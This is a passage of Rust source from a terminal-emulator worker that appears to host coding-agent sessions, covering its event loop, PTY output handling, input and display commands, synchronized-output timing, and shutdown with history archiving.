            reader_wake: Some(reader.wake),
            reader_done: reader.done,
        })
    }

    #[cfg(test)]
    fn disconnected_exit_report(&mut self) {
        let (sender, receiver) = crossbeam_channel::bounded(1);
        drop(sender);
        self.child_exit_rx = receiver;
    }

    fn run(self) {
        let published = Arc::clone(&self.published);
        let events = self.events.clone();
        // Returning from the consuming frame drops the emulator, encoders and
        // render state after final capture and PTY cleanup. Only then may a
        // completion observer rely on ended continuity or retire the result.
        // A panic during teardown skips both publications and retains live
        // inventory rather than certifying unobserved cleanup.
        let completion = self.run_to_completion();
        published
            .completed
            .store(completion.ownership_released, Ordering::Release);
        if let Some(completion) = completion.event {
            let _ = events.send(completion);
        }
    }

    fn run_to_completion(mut self) -> WorkerCompletion {
        // An adopted terminal's title, set by drawing its screen again.
        self.drain_effects();
        if self.visibility == Visibility::Visible {
            self.publish_snapshot(true);
        }

        let mut pty_open = true;
        let mut exited = false;
        let mut shutting_down = false;
        let mut carried_command = None;
        while !shutting_down && (pty_open || !exited) {
            if self.published.shutdown_requested.load(Ordering::Acquire) {
                shutting_down = true;
                break;
            }
            if self.published.interrupt_requested.load(Ordering::Acquire) {
                let boundary = self.interrupt_input();
                if carried_command
                    .as_ref()
                    .is_some_and(|command| is_cancelable_input_before(command, boundary))
                {
                    carried_command = None;
                }
            }
            let close = self
                .published
                .priority_close
                .lock()
                .unwrap_or_else(|p| p.into_inner())
                .take();
            if let Some(close) = close {
                if let Some(carried) = carried_command.take() {
                    self.retained_commands.push_back(carried);
                }
                if self.handle_command(close) {
                    shutting_down = true;
                    break;
                }
            }
            self.flush_pty_input();
            self.publish_bell();
            // Output or a busy input queue must not keep resetting discovery's
            // timeout: an agent can start in an existing shell's process group.
            if self.last_foreground_observation.elapsed() >= self.foreground_poll {
                self.observe_foreground();
            }
            let event = self
                .retained_commands
                .pop_front()
                .or_else(|| carried_command.take())
                .map(|command| WorkerEvent::Command(Some(command)))
                .unwrap_or_else(|| {
                    wait_for_worker_event(
                        &self.commands,
                        &self.pty_rx,
                        &self.child_exit_rx,
                        &self.published.capture_rx,
                        pty_open,
                        !exited,
                        self.foreground_poll
                            .saturating_sub(self.last_foreground_observation.elapsed()),
                        self.synchronized_release_after()
                            .into_iter()
                            .chain(self.bell.release_after())
                            .chain((!self.pending_input.is_empty()).then_some(PTY_WRITE_RETRY))
                            .min(),
                    )
                });
            match event {
                WorkerEvent::Command(Some(command)) => {
                    // A command selected together with the priority wake must
                    // cross the cancellation boundary before it can write.
                    let Some(command) = self.command_before_interrupt(command) else {
                        continue;
                    };
                    self.retain_carried_for_handoff(&command, &mut carried_command);
                    // Wheel bursts otherwise queue one repaint per event. Fold
                    // adjacent viewport deltas before publishing a snapshot.
                    let command =
                        coalesce_scroll_command(command, &self.commands, &mut carried_command);
                    shutting_down = self.handle_command(command);
                }
                WorkerEvent::Command(None) => shutting_down = true,
                WorkerEvent::Capture => self.capture_if_ready(),
                // Foreground observation and pending bells run at the top of
                // the loop. An expired synchronized update is released here.
                WorkerEvent::Timer => self.capture_if_ready(),
                WorkerEvent::Pty(message) => {
                    pty_open = self.handle_pty_message(message);
                }
                WorkerEvent::ChildExit(message) => {
                    self.handle_child_exit(
                        &mut exited,
                        message.unwrap_or_else(|| Err("child reaper closed".into())),
                    );
                }
            }
        }

        // A last bell may still be waiting for its cadence deadline when the
        // PTY drains. Deliver its attention before completion, without holding
        // teardown open for a timer.
        if std::mem::take(&mut self.bell.pending) {
            self.emit(TerminalEvent::Bell);
        }

        // The parser is about to disappear. Preserve its final grid even when
        // a consumer has not returned credit for the preceding frame.
        if self.capture_dirty {
            // A hidden terminal still needs a recoverable final grid once its
            // parser is destroyed. Do not re-enable its visual wake callback.
            if self.visual.is_none() {
                match VisualResources::new() {
                    Ok(visual) => self.visual = Some(visual),
                    Err(error) => self.error("build final terminal snapshot", error.to_string()),
                }
            }
            self.visibility = Visibility::Visible;
            self.published
                .acknowledged_generation
                .store(self.generation, Ordering::Release);
            // Nothing will end a synchronized update the child left open.
            self.capture_when_ready(false);
        }
        if shutting_down && !exited && !self.carried {
            let result = shutdown_child_exit(
                &self.child,
                self.child_identity.as_ref(),
                &self.child_exit_rx,
                self.checked_shutdown,
            );
            self.handle_child_exit(&mut exited, result);
        }
        if let Some(transcript) = self.transcript.take() {
            transcript.finish();
        }

        // Release the reader's blocking wait before waiting on it, then bound
        // that wait: a reader still stuck on a descriptor a disowned
        // grandchild holds open is abandoned rather than joined forever,
        // because a hung join here wedges the daemon's dispatch thread.
        drop(self.reader_wake.take());
        if let Some(reader) = self.reader.take() {
            match self.reader_done.recv_timeout(READER_SHUTDOWN_GRACE) {
                Err(RecvTimeoutError::Timeout) => tracing::warn!(
                    terminal_id = %self.terminal_id,
                    "abandoning PTY reader thread still blocked on its descriptor"
                ),
                _ => {
                    let _ = reader.join();
                }
            }
        }
        let completion = self.root_exit.take().and_then(|event| match event {
            TerminalEvent::Exited {
                exit_code,
                signal,
                intentional,
            } => Some(TerminalEvent::Completed {
                exit_code,
                signal,
                intentional,
            }),
            _ => None,
        });
        if !shutting_down && completion.is_some() {
            *self
                .published
                .archive
                .lock()
                .unwrap_or_else(|p| p.into_inner()) = ArchivePhase::Preparing;
            let history = archive::History::capture(
                &mut self.terminal,
                &self.published.snapshot.load_full(),
                holder::MAX_SCREEN,
            );
            if let Ok(history) = &history {
                let generation = self
                    .published
                    .published_generation
                    .load(Ordering::Acquire)
                    .saturating_add(1);
                self.published.snapshot.store(history.snapshot(generation));
                self.published
                    .published_generation
                    .store(generation, Ordering::Release);
                if history.omitted > 0 {
                    self.error("retain completed terminal history", format!("The completed terminal retains its newest rows within 8 MiB; {} older rows are unavailable.", history.omitted));
                }
            } else if let Err(message) = &history {
                self.error("retain completed terminal history", message.clone());
            }
            *self
                .published
                .archive
                .lock()
                .unwrap_or_else(|p| p.into_inner()) = ArchivePhase::Frozen {
                history,
                events: self.events.clone(),
            };
            self.published.archive_ready.notify_all();
            self.published
                .request_wake(self.published.published_generation.load(Ordering::Acquire));
            while let Ok(command) = self.commands.try_recv() {
                let _ = self.published.archived_command(command);
            }
        }
        let ownership_released = completion.is_some() || self.carried;
        if !ownership_released && self.holder.registered() {
            // A missing exit report cannot authorize a fresh replacement or
            // erase the holder's recovery record. Retain that exact owner for
            // a successor without claiming a successful completed handoff.
            if let Err(error) = carry::screen(&mut self.terminal, holder::MAX_SCREEN)
                .and_then(|screen| self.holder.cache_screen(&screen))
            {
                self.error("retain unconfirmed terminal screen", error);
            }
            self.holder.leave_for_successor();
            drop(self.holder);
        } else if !shutting_down && completion.is_some() && self.holder.registered() {
            self.holder.prove_cleanup();
            if let Err(error) = carry::screen(&mut self.terminal, holder::MAX_SCREEN)
                .and_then(|screen| self.holder.cache_screen(&screen))
            {
                self.error("retain completed terminal screen", error);
            }
            *self
                .published
                .retained_holder
                .lock()
                .unwrap_or_else(|poisoned| poisoned.into_inner()) = Some(self.holder);
        } else {
            drop(self.holder);
        }
        drop(self.writer);
        drop(self.master);
        // Terminal, render state, and every Ghostty encoder drop here, on the
        // same OS thread on which they were constructed and used.
        WorkerCompletion {
            event: completion,
            ownership_released,
        }
    }

    fn handle_child_exit(&mut self, exited: &mut bool, result: ChildExit) {
        let intentional = self
            .child_identity
            .as_ref()
            .is_some_and(RootIdentity::intentionally_killed);
        if let Some(event) = child_exit_event(exited, result, intentional) {
            self.root_exit = Some(event.clone());
            self.agent_exited = true;
            self.agent_provider = None;
            self.adopt_agent_process(None);
            self.emit(event);
        }
    }

    fn handle_pty_message(&mut self, message: Option<PtyMessage>) -> bool {
        match message {
            Some(PtyMessage::Bytes(mut bytes)) => {
                while bytes.len() < PTY_BATCH_LIMIT {
                    match self.pty_rx.try_recv() {
                        Ok(PtyMessage::Bytes(next)) => bytes.extend_from_slice(&next),
                        Ok(PtyMessage::Eof) => {
                            self.process_output(bytes);
                            return false;
                        }
                        Ok(PtyMessage::Error(error)) => {
                            self.error("read PTY", error);
                            self.process_output(bytes);
                            return false;
                        }
                        Err(TryRecvError::Empty) => break,
                        Err(TryRecvError::Disconnected) => {
                            self.process_output(bytes);
                            return false;
                        }
                    }
                }
                self.process_output(bytes);
                true
            }
            Some(PtyMessage::Eof) | None => false,
            Some(PtyMessage::Error(error)) => {
                self.error("read PTY", error);
                false
            }
        }
    }

    fn process_output(&mut self, bytes: Vec<u8>) {
        if bytes.is_empty() {
            return;
        }
        let observed_sequence = {
            let mut activity = self
                .published
                .activity
                .lock()
                .unwrap_or_else(|error| error.into_inner());
            let sequence = activity.map_or(1, |fact| fact.sequence.saturating_add(1));
            let last_output_at_unix_ms = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .map(|elapsed| elapsed.as_millis().min(i64::MAX as u128) as i64)
                .unwrap_or(-1);
            *activity = Some(TerminalOutputActivity {
                sequence,
                last_output_at_unix_ms,
            });
            (self.published.output_armed.load(Ordering::Acquire)
                && self.published.output_armed.swap(false, Ordering::AcqRel))
            .then_some(sequence)
        };
        if let Some(sequence) = observed_sequence
            && let Some(observer) = self.published.output_observer.get()
        {
            observer(sequence);
        }

        let parse_started =
            tracing::enabled!(target: "cagents::terminal_pipeline", tracing::Level::TRACE)
                .then(std::time::Instant::now);
        self.terminal.vt_write(&bytes);
        if let Some(started) = parse_started {
            tracing::trace!(target: "cagents::terminal_pipeline", stage = "parse",
                terminal_id = %self.terminal_id, bytes = bytes.len(),
                elapsed_ns = started.elapsed().as_nanos() as u64);
        }
        self.observe_synchronized_output(&bytes);

        // Hand the batch over instead of copying up to PTY_BATCH_LIMIT bytes
        // into a channel that drops them under exactly the flood that makes
        // the copy expensive, and that records nothing at all past its cap.
        if let Some(transcript) = &self.transcript
            && transcript.accepts()
            && transcript.send(bytes).is_err()
        {
            self.error("write transcript", "transcript writer closed".into());
            self.transcript = None;
        }

        self.drain_effects();
        self.publish_snapshot(false);
    }

    fn command_before_interrupt(&mut self, command: Command) -> Option<Command> {
        if self.published.interrupt_requested.load(Ordering::Acquire) {
            // A coalesced scroll may already own the carry slot. Return the
            // selected command to the inbox without replacing that control.
            self.retained_commands.push_front(command);
            None
        } else {
            Some(command)
        }
    }

    fn retain_carried_for_handoff(&mut self, command: &Command, carried: &mut Option<Command>) {
        if matches!(command, Command::CheckInputDrained(_) | Command::PrepareUpgrade(_) | Command::Carry { .. }) {
            if let Some(command) = carried.take() {
                // An interrupt can retain a control ahead of the command a
                // previous scroll coalescer already selected. Include that
                // accepted command in the handoff's drain/refusal contract.
                self.retained_commands.push_front(command);
            }
        }
    }

    /// Returns true when shutdown was requested.
    fn handle_command(&mut self, command: Command) -> bool {
        match command {
            Command::OrderedInput { input, .. } => return self.handle_command(*input),
            Command::Interrupt(key) => {
                self.published.request_interrupt(key);
            }
            Command::ReadViewport {
                offset,
                rows,
                reply,
            } => {
                self.viewport_reads.push((offset, rows, reply));
                if self.capture_dirty {
                    // This explicit next-frame request grants one capture
                    // credit. Waiting for its future ACK would deadlock.
                    self.published
                        .acknowledged_generation
                        .fetch_max(self.generation, Ordering::AcqRel);
                    self.capture_when_ready(true);
                }
                if !self.capture_dirty {
                    self.finish_viewport_reads();
                }
            }
            Command::ApplyAgentActivity {
                process,
                activity,
                title,
                reply,
                deadline,
            } => {
                let proposed = Some(activity.unwrap_or(crate::agent::Activity {
                    provider: process.provider,
                    state: crate::agent::ActivityState::Unknown,
                }));
                let current_activity = *self
                    .published
                    .agent_activity
                    .lock()
                    .unwrap_or_else(|p| p.into_inner());
                let unchanged = self.agent_process.as_ref() == Some(&process)
                    && current_activity == proposed
                    && title.as_ref().is_none_or(|title| {
                        self.published
                            .conversation_title
                            .lock()
                            .unwrap_or_else(|p| p.into_inner())
                            .as_deref()
                            .is_some_and(|current| current.chars().eq(title.chars().take(256)))
                    });
                // An unchanged sample has nothing to apply. Validate liveness
                // without walking launchers or reading environments; periodic
                // discovery still notices exec and refreshes hidden recovery.
                // Never use this shortcut to publish a changed activity/title.
                if unchanged
                    && std::time::Instant::now() < deadline
                    && self.foreground_group().is_some_and(|group| {
                        crate::model::agent_recovery::process_in_foreground(&process, group)
                            && self.foreground_group() == Some(group)
                    })
                {
                    let _ = reply.send(current_activity);
                    return false;
                }
                let current = self.observe_agent_process();
                let valid = std::time::Instant::now() < deadline && current == Some(&process);
                let activity = if valid {
                    // Process identity is known even when the provider cannot
                    // report a state (for example, before its first message).
                    Some(activity.unwrap_or(crate::agent::Activity {
                        provider: process.provider,
                        state: crate::agent::ActivityState::Unknown,
                    }))
                } else {
                    None
                };
                self.set_agent_activity(activity);
                if valid && let Some(title) = title {
                    self.set_conversation_title(title);
                }
                let _ = reply.send(
                    *self
                        .published
                        .agent_activity
                        .lock()
                        .unwrap_or_else(|error| error.into_inner()),
                );
            }
            Command::CloseIfRevision { revision, reply } => {
                let order = self.published.input_order.lock().unwrap_or_else(|p| p.into_inner());
                let outcome = if order.closing || order.handoff || order.close_revision != revision {
                    Err("Terminal input changed after close consent; refresh the worktree census".into())
                } else {
                    // No live terminal path currently has the authoritative
                    // proof needed to accept this close. Do not freeze or
                    // inspect a process family merely to refuse it anyway.
                    Err("This terminal cannot confirm that its work is unchanged. Close it explicitly, then refresh the worktree.".into())
                };
                let _ = reply.send(outcome);
            }
            Command::StopSession {instance, deadline, reply} => {
                use super::ipc::TerminalCloseResult;
                if self.published.execution_instance != instance {
                    let _ = reply.send(TerminalCloseResult::Unknown("The terminal worker was replaced".into()));
                    return false;
                }
                let outcome = match self.inspect_close(deadline) {
                    Ok((_, mut family)) => match family.kill(deadline) {
                        Ok(()) => { self.checked_shutdown = true; self.holder.prove_cleanup(); TerminalCloseResult::Closed },
                        Err(detail) => TerminalCloseResult::Unknown(detail),
                    },
                    Err(detail) => TerminalCloseResult::Unknown(detail),
                };
                let close = outcome == TerminalCloseResult::Closed;
                let _ = reply.send(outcome);
                return close;
            }
            Command::CloseChecked {
                allow_active,
                deadline,
                reply,
            } => {
                use super::ipc::TerminalCloseResult;
                let outcome = match self.inspect_close(deadline) {
                    Ok((true, _)) if !allow_active => TerminalCloseResult::Active,
                    Ok((_, mut family)) => match family.kill(deadline) {
                        Ok(()) => {
                            self.checked_shutdown = true;
                            self.holder.prove_cleanup();
                            TerminalCloseResult::Closed
                        }
                        Err(detail) => TerminalCloseResult::Unknown(detail),
                    },
                    Err(detail) => TerminalCloseResult::Unknown(detail),
                };
                let close = outcome == TerminalCloseResult::Closed;
                let _ = reply.send(outcome);
                return close;
            }
            Command::CheckInputDrained(reply) => {
                let _ = reply.send(self.input_drained_for_handoff());
            }
            Command::PrepareUpgrade(reply) => {
                let result = self.input_drained_for_handoff().and_then(|()| self
                    .inspect_close(std::time::Instant::now() + std::time::Duration::from_secs(3)))
                    .and_then(|(active, family)| {
                        self.refresh_resume_hint(true);
                        if active && self.resume_hint.as_deref()
                            .and_then(crate::model::agent_recovery::recipe_from_hint).is_some()
                            && !self.agent_process.as_ref().is_some_and(|process| family.only_agent_tree(process.pid))
                        {
                            return Err("Terminal also owns unrelated background jobs; finish or close them before upgrading".into());
                        }
                        Ok(UpgradeSnapshot {
                            hint: self.resume_hint.clone(),
                            size: self.current_size,
                            theme: self.theme.get(),
                            active,
                            family,
                        })
                    });
                let _ = reply.send(result);
            }
            Command::Carry { socket, reply } => {
                let carried = self.carry(&socket);
                let succeeded = carried.is_ok();
                let _ = reply.send(carried);
                return succeeded;
            }
            Command::PreserveForRestart(reply) => {
                if !self.holder.registered() {
                    let _ = reply.send(Err(
                        "legacy terminal has no persistent holder endpoint".into()
                    ));
                    return false;
                }
                self.carried = true;
                self.holder.leave_for_successor();
                let _ = reply.send(Ok(()));
                return true;
            }
            Command::ObserveAgent(sender) => {
                self.refresh_resume_hint(true);
                let _ = sender.send(self.resume_hint.clone());
            }
            Command::ObserveAgentProcess(sender) => {
                let process = self.observe_agent_process().cloned();
                let _ = sender.send(process);
            }
            Command::Input(bytes) => {
                self.write_pty(&bytes, "write terminal input");
            }
            Command::Paste(text, origin) => self.paste(&text, origin),
            Command::Key(input) => self.encode_key(input),
            Command::Mouse(input) => self.encode_mouse(input),
            Command::Focus(focused) => {
                if focused {
                    self.refresh_resume_hint(true);
                }
                match self.terminal.mode(Mode::FOCUS_EVENT) {
                    Ok(true) => {}
                    Ok(false) => return false,
                    Err(error) => {
                        self.error("read focus-reporting mode", error.to_string());
                        return false;
                    }
                }
                let mut buffer = [0u8; 8];
                let event = if focused {
                    focus::Event::Gained
                } else {
                    focus::Event::Lost
                };
                match event.encode(&mut buffer) {
                    Ok(written) => {
                        self.write_pty(&buffer[..written], "write focus report");
                    }
                    Err(error) => self.error("encode focus report", error.to_string()),
                }
            }
            Command::Resize(size) => self.resize(size),
            Command::Scroll(scroll) => {
                self.terminal.scroll_viewport(match scroll {
                    ScrollCommand::Top => ScrollViewport::Top,
                    ScrollCommand::Bottom => ScrollViewport::Bottom,
                    ScrollCommand::Delta(delta) => ScrollViewport::Delta(delta),
                    ScrollCommand::Row(row) => ScrollViewport::Row(row),
                });
                if self.visibility == Visibility::Visible {
                    self.publish_snapshot(false);
                }
            }
            Command::SetTheme(theme) => {
                if self.theme.get() != theme {
                    match apply_theme(&mut self.terminal, theme) {
                        Ok(()) => {
                            self.theme.set(theme);
                            if self
                                .terminal
                                .mode(Mode::COLOR_SCHEME_REPORT)
                                .unwrap_or(false)
                            {
                                let mut buffer = [0; 32];
                                if let Ok(len) = theme_scheme(theme).encode_report(&mut buffer) {
                                    self.write_pty(&buffer[..len], "report terminal color scheme");
                                }
                            }
                            self.publish_snapshot(true);
                        }
                        Err(error) => self.error("set terminal theme", error.to_string()),
                    }
                }
            }
            Command::Search {
                owner,
                request,
                query,
                case_sensitive,
                latest,
            } => {
                match super::search::search(&self.terminal, &query, case_sensitive, || {
                    latest.load(Ordering::Acquire) != request
                }) {
                    Ok(Some((matches, truncated))) => self.emit(TerminalEvent::SearchResults {
                        owner,
                        request,
                        query,
                        matches,
                        truncated,
                    }),
                    Ok(None) => {}
                    Err(error) => self.error("search terminal", error.to_string()),
                }
            }
            Command::Hide => self.set_hidden(),
            Command::ClearScrollback => {
                self.terminal.vt_write(b"\x1b[3J");
                self.publish_snapshot(true);
            }
            Command::CopySelection { request, selection } => {
                match super::search::selected_text(&self.terminal, selection) {
                    Ok(text) => self.emit(TerminalEvent::ClipboardText { request, text }),
                    Err(error) => self.error("copy terminal selection", error),
                }
            }
            Command::HostVisibility(visibility) => match visibility {
                Visibility::Visible => self.reveal(),
                Visibility::Hidden => self.set_hidden(),
                Visibility::Hibernated => self.hibernate_visuals(),
            },
            Command::Reveal => self.reveal(),
            Command::Hibernate => self.hibernate_visuals(),
            Command::Restore { visible } => self.restore_visuals(visible),
            Command::Shutdown => return true,
        }
        false
    }

    fn encode_key(&mut self, input: KeyInput) {
        match encode_key_input(&self.terminal, &mut self.key_encoder, input) {
            Ok(encoded) => {
                self.write_pty(&encoded, "write encoded key");
            }
            Err(error) => self.error("encode key", error.to_string()),
        }
    }

    /// Pastes the way Ghostty does: the view returns to the prompt the text is
    /// going to, and the text is framed for whichever paste mode the child
    /// is in at the moment it arrives.
    fn paste(&mut self, text: &str, origin: PasteOrigin) {
        match encode_paste(&self.terminal, text, origin) {
            Ok(encoded) => {
                if encoded.is_empty() {
                    return;
                }
                self.terminal.scroll_viewport(ScrollViewport::Bottom);
                if self.visibility == Visibility::Visible {
                    self.publish_snapshot(false);
                }
                self.write_pty(&encoded, "write terminal paste");
            }
            Err(error) => self.error("encode terminal paste", error.to_string()),
        }
    }

    fn encode_mouse(&mut self, input: MouseInput) {
        let mut event = match mouse::Event::new() {
            Ok(event) => event,
            Err(error) => {
                self.error("create mouse event", error.to_string());
                return;
            }
        };
        event
            .set_action(map_mouse_action(input.action))
            .set_button(input.button.map(map_mouse_button))
            .set_mods(map_modifiers(input.modifiers))
            .set_position(mouse::Position {
                x: input.x,
                y: input.y,
            });
        self.mouse_encoder
            .set_options_from_terminal(&self.terminal)
            .set_any_button_pressed(input.any_button_pressed)
            .set_size(mouse::EncoderSize {
                screen_width: input.screen_width.max(1),
                screen_height: input.screen_height.max(1),
                cell_width: input.cell_width.max(1),
                cell_height: input.cell_height.max(1),
                padding_top: 0,
                padding_bottom: 0,
                padding_right: 0,
                padding_left: 0,
            });
        let mut encoded = Vec::with_capacity(32);
        match self.mouse_encoder.encode_to_vec(&event, &mut encoded) {
            Ok(()) => {
                self.write_pty(&encoded, "write encoded mouse event");
            }
            Err(error) => self.error("encode mouse event", error.to_string()),
        }
    }

    fn resize(&mut self, mut size: TerminalSize) {
        size.columns = size.columns.max(1);
        size.rows = size.rows.max(1);
        size.cell_width_px = size.cell_width_px.max(1);
        size.cell_height_px = size.cell_height_px.max(1);
        if size == self.applied_pty_size && size == self.applied_parser_size {
            return;
        }
        // Record only what actually took effect. A failed ioctl cached as the
        // current size would swallow every later identical request, including
        // the steady-state size the widget re-sends, and the child would keep
        // its old SIGWINCH dimensions for the rest of its life.
        if size != self.applied_pty_size {
            match self.master.resize(pty_size(size)) {
                Ok(()) => self.applied_pty_size = size,
                Err(error) => self.error("resize PTY", error.to_string()),
            }
        }
        if size != self.applied_parser_size {
            match self.terminal.resize(
                size.columns,
                size.rows,
                size.cell_width_px,
                size.cell_height_px,
            ) {
                Ok(()) => {
                    self.applied_parser_size = size;
                    // The parser ends an update when it resizes; the next one
                    // gets its own full hold.
                    self.synchronized_since = None;
                }
                Err(error) => self.error("resize terminal", error.to_string()),
            }
        }
        self.current_size = size;
        if self.visibility == Visibility::Visible {
            self.publish_snapshot(true);
        }
    }

    fn set_hidden(&mut self) {
        self.visibility = Visibility::Hidden;
        self.published.suppress_wakes();
        // Nothing is published while away, so there is no update to time.
        self.synchronized_since = None;
    }

    fn reveal(&mut self) {
        self.published
            .acknowledged_generation
            .store(self.generation, Ordering::Release);
        if self.visual.is_none() {
            match VisualResources::new() {
                Ok(visual) => self.visual = Some(visual),
                Err(error) => {
                    self.error("restore render state", error.to_string());
                    return;
                }
            }
        }
        self.visibility = Visibility::Visible;
        // An update seen before the card went away must not count against one
        // in progress now: that one gets its own full hold.
        self.synchronized_since = None;
        // Observe promptly again: whatever ran in the background while this
        // card was away is what the user is now looking at.
        self.foreground_poll = FOREGROUND_POLL_MIN;
        self.published.visible.store(true, Ordering::Release);
        self.publish_snapshot(true);
    }

    fn hibernate_visuals(&mut self) {
        self.visibility = Visibility::Hibernated;
        self.published.suppress_wakes();
        self.synchronized_since = None;
        self.visual = None;
        self.generation = self.generation.saturating_add(1);
        self.published.detach(self.generation);
        // Render state is the small half. The parser's scrollback pool is tens
        // of MiB for a wide grid and, with `max_scrollback` fixed at
        // construction, is otherwise retained for as long as the card exists.
        //
        // libghostty-vt 0.2.1 exposes no way to lower that limit or drop the
        // history tail, and rebuilding the parser from the viewport is not an
        // option for a card that can be revealed again: its child is still
        // running, so modes, the alternate screen, cursor state and keyboard
        // and mouse protocol state would all be lost under a live TUI. A full
        // compression pass is the reclamation that keeps the contract - it
        // changes only the storage representation, never the logical
        // contents - and its one synchronous scan is affordable exactly here,
        // where nothing is waiting on a frame.
        match self.terminal.compress(CompressionMode::Full) {
            Ok(CompressionResult::Unsupported) => tracing::debug!(
                terminal_id = %self.terminal_id,
                "scrollback reclamation is unavailable on this target"
            ),
            Ok(_) => {}
            Err(error) => tracing::debug!(
                terminal_id = %self.terminal_id,
                %error,
                "hibernated terminal could not compress its scrollback"
            ),
        }
    }

    fn restore_visuals(&mut self, visible: bool) {
        if visible {
            self.reveal();
        } else {
            self.set_hidden();
        }
    }

    fn publish_snapshot(&mut self, force: bool) {
        self.capture_dirty = true;
        self.force_capture |= force;
        self.capture_if_ready();
    }

    fn capture_if_ready(&mut self) {
        self.capture_when_ready(true);
    }

    /// Publishes the grid if it changed and the consumer has returned credit.
    /// With `honor_synchronized_output`, an update in progress keeps the grid
    /// back whatever asked for it: a reveal or theme change mid-update would
    /// otherwise show the frame half drawn. A resize is never held, because
    /// the parser ends the update when it resizes.
    fn capture_when_ready(&mut self, honor_synchronized_output: bool) {
        if !self.capture_dirty
            || self
                .published
                .acknowledged_generation
                .load(Ordering::Acquire)
                < self.generation
        {
            return;
        }
        if self.visibility != Visibility::Visible {
            return;
        }
        if honor_synchronized_output && self.synchronized_output_holds() {
            return;
        }
        let Some(visual) = self.visual.as_mut() else {
            return;
        };
        let next_generation = self.generation.saturating_add(1);
        let activity = *self
            .published
            .activity
            .lock()
            .unwrap_or_else(|error| error.into_inner());
        let capture_started =
            tracing::enabled!(target: "cagents::terminal_pipeline", tracing::Level::TRACE)
                .then(std::time::Instant::now);
        let captured = visual.capture(
            &self.terminal,
            next_generation,
            self.force_capture,
            activity,
        );
        if let Some(started) = capture_started {
            tracing::trace!(target: "cagents::terminal_pipeline", stage = "capture",
                terminal_id = %self.terminal_id, generation = next_generation,
                activity_sequence = activity.map_or(0, |fact| fact.sequence),
                published = matches!(&captured, Ok(Some(_))),
                elapsed_ns = started.elapsed().as_nanos() as u64);
        }
        match captured {
            Ok(Some(snapshot)) => {
                self.capture_dirty = false;
                self.force_capture = false;
                self.generation = next_generation;
                self.published.publish(snapshot);
            }
            Ok(None) => {
                self.capture_dirty = false;
                self.force_capture = false;
            }
            Err(error) => self.error("build terminal snapshot", error.to_string()),
        }
        self.finish_viewport_reads();
    }

    fn finish_viewport_reads(&mut self) {
        if self.capture_dirty {
            return;
        }
        let base = self.published.snapshot.load_full();
        for (offset, rows, reply) in std::mem::take(&mut self.viewport_reads) {
            let result = super::snapshot::capture_viewport(&self.terminal, &base, offset, rows)
                .map_err(|error| error.to_string());
            let _ = reply.send(result);
        }
    }

    /// Whether the child is inside a synchronized update that may still
    /// withhold its output, starting the update's hold on first sight.
    fn synchronized_output_holds(&mut self) -> bool {
        let active = match self.terminal.mode(Mode::SYNC_OUTPUT) {
            Ok(active) => active,
            Err(error) => {
                self.error("read synchronized output mode", error.to_string());
                false
            }
        };
        if !active {
            self.synchronized_since = None;
            return false;
        }
        let since = *self
            .synchronized_since
            .get_or_insert_with(std::time::Instant::now);
        since.elapsed() < SYNCHRONIZED_OUTPUT_TIMEOUT
    }

    /// Times synchronized updates per read batch, whether or not the batch
    /// can publish. A capture samples the mode only when credit allows, so an
    /// update that ends and restarts inside one batch, or across batches while
    /// the consumer owes credit, would otherwise read as one long update and
    /// lose its hold to the timeout under sustained output.
    fn observe_synchronized_output(&mut self, bytes: &[u8]) {
        const END: &[u8] = b"\x1b[?2026l";
        let ended = bytes.windows(END.len()).any(|window| window == END);
        // A read error is reported by the capture that consults the mode.
        let active = self.terminal.mode(Mode::SYNC_OUTPUT).unwrap_or(false);
        if ended || !active {
            self.synchronized_since = None;
        }
        // Nothing is published while away, so only a visible card times one.
        if active && self.visibility == Visibility::Visible {
            self.synchronized_since
                .get_or_insert_with(std::time::Instant::now);
        }
    }

    /// How long until the update holding back a dirty grid loses its hold.
    /// `None` once the hold has lapsed: from then on output and returned
    /// credit publish as usual, and a timer would only spin while the
    /// consumer still owes credit.
    fn synchronized_release_after(&self) -> Option<Duration> {
        let since = self.synchronized_since.filter(|_| self.capture_dirty)?;
        SYNCHRONIZED_OUTPUT_TIMEOUT.checked_sub(since.elapsed())
    }

    fn drain_effects(&mut self) {
        let effects = std::mem::take(&mut *self.effects.borrow_mut());
        for effect in effects.ordered {
            match effect {
                Effect::PtyWrite(bytes) => {
                    self.write_pty(&bytes, "write terminal response");
                }
                Effect::Bell => {
                    self.bell.pending = true;
                    self.publish_bell();
                }
                Effect::WorkingDirectoryChanged => {
                    let raw = self.terminal.pwd().unwrap_or_default();
                    let path = working_directory_path(raw, local_host_name());
                    if let Some(path) = path {
                        self.emit(TerminalEvent::WorkingDirectoryChanged(path));
                    }
                }
                Effect::Title(title) => {
                    let title = if self.agent_provider == Some(crate::agent::Provider::Codex) {
                        crate::agent::codex_title_without_status(&title)
                    } else {
                        &title
                    };
                    let activity = self.agent_provider.and_then(|provider| {
                        provider
                            .activity_from_title(&title)
                            .map(|state| crate::agent::Activity { provider, state })
                    });
                    let display_changed = match agent_title_label(&title, activity) {
                        Some("") => self.display_title != "π",
                        Some(label) => self.display_title.strip_prefix("π ") != Some(label),
                        None => self.display_title != title,
                    };
                    let previous = *self
                        .published
                        .agent_activity
                        .lock()
                        .unwrap_or_else(|error| error.into_inner());
                    if display_changed || activity != previous {
                        self.refresh_resume_hint(true);
                    }
                    let observed = self.agent_provider.and_then(|provider| {
                        provider
                            .activity_from_title(&title)
                            .map(|state| crate::agent::Activity { provider, state })
                    });
                    if self.agent_provider == Some(crate::agent::Provider::Omp) {
                        self.set_agent_activity(
                            self.agent_process
                                .as_ref()
                                .filter(|process| process.provider == crate::agent::Provider::Omp)
                                .and(observed),
                        );
                    }
                    if display_changed || observed != activity {
                        if let Some(process) = &self.agent_process
                            && let Some(name) = process
                                .provider
                                .conversation_title(&title, &process.launch.working_directory)
                        {
                            self.set_conversation_title(name.into());
                        }
                        let display = canonical_agent_title(&title, observed);
                        if display != self.display_title {
                            self.display_title = display.clone();
                            self.emit(TerminalEvent::TitleChanged(display));
                        }
                    }
                }
            }
        }
    }

    fn publish_bell(&mut self) {
        if self.bell.pending && self.bell.take_ready(std::time::Instant::now()) {
            self.emit(TerminalEvent::Bell);
        }
    }

    fn input_drained_for_handoff(&self) -> Result<(), String> {
        if !self.pending_input.is_empty() || !self.commands.is_empty() || !self.retained_commands.is_empty() {
            return Err("Terminal input or control is still pending; let it finish or cancel input before upgrading".into());
        }
        Ok(())
    }

    /// Stops reading the terminal, takes in everything already read, and
    /// detaches its holder with the screen that output drew. A terminal that
    /// cannot be detached is read again; one whose reader would not stop is
    /// left to that reader.
